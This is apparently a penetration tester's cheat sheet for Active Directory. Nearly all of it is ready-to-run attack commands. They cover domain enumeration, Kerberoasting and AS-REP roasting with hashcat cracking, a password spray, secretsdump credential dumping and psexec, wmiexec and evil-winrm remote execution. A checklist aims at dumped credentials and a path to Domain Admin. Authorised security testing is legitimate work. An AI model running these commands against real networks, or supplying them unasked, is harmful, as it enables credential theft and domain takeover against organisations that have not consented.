# Active Directory Quick Reference (Assessment Cheat Sheet)

## 1. Initial Checks
```bash
nxc smb <DC_IP> -u user -p pass
nxc smb <DC_IP> -u user -p pass --shares
nxc smb <DC_IP> -u user -p pass --users
nxc smb <DC_IP> -u user -p pass --groups
nxc smb <DC_IP> -u user -p pass --pass-pol
```

## 2. BloodHound Collection
```bash
bloodhound-python -d domain.local -u user -p pass -ns <DC_IP> -c All
```

## 3. Kerberoasting
```bash
GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request
# or
nxc ldap <DC_IP> -u user -p pass --kerberoasting kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt
```

## 4. AS-REP Roasting
```bash
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

## 5. Password Spray (Careful)
```bash
nxc smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success
```

## 6. Useful Impacket
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC_IP>
secretsdump.py domain.local/user:pass@<TARGET>
psexec.py domain.local/user:pass@<TARGET>
wmiexec.py domain.local/user:pass@<TARGET>
evil-winrm -i <TARGET> -u user -p pass
```

## 7. High-Value BloodHound Queries
- Shortest paths to Domain Admins
- Kerberoastable users
- AS-REP Roastable users
- Unconstrained Delegation
- Users with DCSync rights
- Interesting ACLs (GenericAll, WriteDACL, ForceChangePassword)

## 8. Quick Wins Checklist
- [ ] Password policy checked
- [ ] Kerberoastable accounts found & tested
- [ ] AS-REP Roastable accounts found & tested
- [ ] BloodHound paths reviewed
- [ ] Local admin access on any host?
- [ ] Credentials dumped?
- [ ] Path to Domain Admin documented?
